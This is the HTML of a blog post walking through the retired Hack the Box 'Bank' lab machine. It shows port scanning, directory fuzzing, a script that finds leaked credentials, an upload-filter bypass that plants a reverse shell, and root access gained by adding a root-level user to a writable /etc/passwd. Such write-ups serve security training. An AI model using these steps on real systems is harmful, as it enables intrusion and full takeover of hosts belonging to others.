@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Hack the Box - Bank - Calxus Blog</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Calxus Blog" property="og:site_name">
+  
+    <meta content="Hack the Box - Bank" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located." property="og:description">
+  
+  
+    <meta content="http://localhost:4000/bank-walkthrough/" property="og:url">
+  
+  
+    <meta content="2020-08-11T13:54:22+01:00" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/bank.png" property="og:image">
+  
+  
+    
+    <meta content="HackTheBox" property="article:section">
+    
+  
+  
+    
+    <meta content="Easy" property="article:tag">
+    
+    <meta content="Linux" property="article:tag">
+    
+    <meta content="Retired" property="article:tag">
+    
+    <meta content="CTF" property="article:tag">
+    
+  
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@TheCalxus">
+  
+    <meta name="twitter:title" content="Hack the Box - Bank">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/bank-walkthrough/">
+  
+  
+    <meta name="twitter:description" content="Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located.">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/bank.png">
+  
+
+	<meta name="description" content="Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located.">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/calxus.png" alt="Calxus"></a>
+      </div>
+      <div class="author-name">Calxus</div>
+      <p>DevOps Engineer with a penchant for pentesting and proud owner of an over-engineered home network</p>
+      <div style="height: 5px"></div>
+      <div class="author-name"><a href="/hackthebox">hack the box</a></div>
+      <div class="site-category"><a href="/homenetwork">home network</a></div>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        <li><a href="https://twitter.com/TheCalxus" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <li class="github"><a href="http://github.com/calxus" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li class="email"><a href="mailto:calxus@protonmail.ch"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a href="https://hackthebox.eu/profile/317303" target="_blank"><i class="fa fa-cube"></i></a></li>
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2021 &copy; Calxus</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/bank.png alt="Hack the Box - Bank">
+        
+          <figcaption>Bank</figcaption>
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Hack the Box - Bank</h1>
+        <div class="page-date"><span>2020, Aug 11&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="overview">Overview</h2>
+<p>Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
+└─$ sudo nmap -p- -T4   10.129.117.190 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 14:10 GMT
+Nmap scan report for 10.129.117.190
+Host is up (0.016s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds
+</code></pre></div></div>
+<p>After port enumeration it is relatively clear that port 80 is what we should focus on, but when we navigate to it in the browser we only receive the default page. Slightly annoyingly the hostname needs to be guessed <code class="language-plaintext highlighter-rouge">bank.htb</code>, when we use that though we are greeted with a login page. On fuzzing that domain name we find an unusual directory <code class="language-plaintext highlighter-rouge">balance-transfer</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
+└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bank.htb/FUZZ      
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.2.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://bank.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]
+assets                  [Status: 301, Size: 304, Words: 20, Lines: 10]
+                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
+inc                     [Status: 301, Size: 301, Words: 20, Lines: 10]
+                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
+server-status           [Status: 403, Size: 288, Words: 21, Lines: 11]
+balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]
+:: Progress: [220547/220547] :: Job [1/1] :: 2573 req/sec :: Duration: [0:01:34] :: Errors: 0 ::
+</code></pre></div></div>
+<p>When we go to the balance-transfer directory we see multiple files, to help find an unusual file I wrote a script to help find it.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib3</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="k">def</span> <span class="nf">get_url_paths</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">ext</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{}):</span>
+    <span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="p">.</span><span class="n">PoolManager</span><span class="p">()</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">'GET'</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">response_text</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">data</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response_text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
+    <span class="n">parent</span> <span class="o">=</span> <span class="p">[</span><span class="n">url</span> <span class="o">+</span> <span class="n">node</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'href'</span><span class="p">)</span> <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span> <span class="k">if</span> <span class="n">node</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'href'</span><span class="p">).</span><span class="n">endswith</span><span class="p">(</span><span class="n">ext</span><span class="p">)]</span>
+    <span class="k">return</span> <span class="n">parent</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://bank.htb/balance-transfer/'</span>
+<span class="n">ext</span> <span class="o">=</span> <span class="s">'acc'</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">get_url_paths</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">ext</span><span class="p">)</span>
+<span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="p">.</span><span class="n">PoolManager</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">account_url</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="n">account_url</span><span class="p">,</span> <span class="n">preload_content</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">content_bytes</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"Content-Length"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">content_bytes</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">581</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">content_bytes</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">account_url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">content_bytes</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">585</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">content_bytes</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">account_url</span><span class="p">)</span>
+</code></pre></div></div>
+<p>When we find that file we can see login credentials contained within.</p>
+<h2 id="foothold">Foothold</h2>
+<p>On browsing the site we find a support page that you can use to upload files, located in the source code on the page is a comment that says you can use the <code class="language-plaintext highlighter-rouge">.htb</code> extension to bypass the upload filter. When we do this we can upload a reverse shell, then access it in the uploads folder.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
+└─$ nc -nlvp 4242
+listening on [any] 4242 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.117.190] 35620
+www-data@bank:/var/www/bank/uploads$ whoami
+whoami
+www-data
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>When running linpeas we see that <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is writable. So I took a copy of the current <code class="language-plaintext highlighter-rouge">passwd</code> file generated a new password hash and added a line for a new user with the same uid and gid of root then copied it back up to the server.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
+└─$ mkpasswd --method=SHA-512 --stdin                                                                                                                                                                                                  130 ⨯
+Password: random
+$6$Odmo32dEorRGP6Fd$gxwLG7SEJks59m90cpk6nZdVPlaXylsGoWYEVRiVdisbZuHUesHZPgUQrbP.4i338A7K4J9d67CghfiRkCzpL0
+</code></pre></div></div>
+<p>After doing that we can switch to that new user</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bank:/tmp$ su test
+su test
+Password: random
+
+root@bank:/tmp# whoami
+whoami
+root
+</code></pre></div></div>
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Hack the Box - Bank&url=http://localhost:4000/bank-walkthrough/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/bank-walkthrough/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/bank-walkthrough/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#Easy" class="tag">&#35; Easy</a>
+          
+            <a href="/tags#Linux" class="tag">&#35; Linux</a>
+          
+            <a href="/tags#Retired" class="tag">&#35; Retired</a>
+          
+            <a href="/tags#CTF" class="tag">&#35; CTF</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js"></script>
+<script src="/assets/js/main.js"></script>
+
+</body>
+</html>
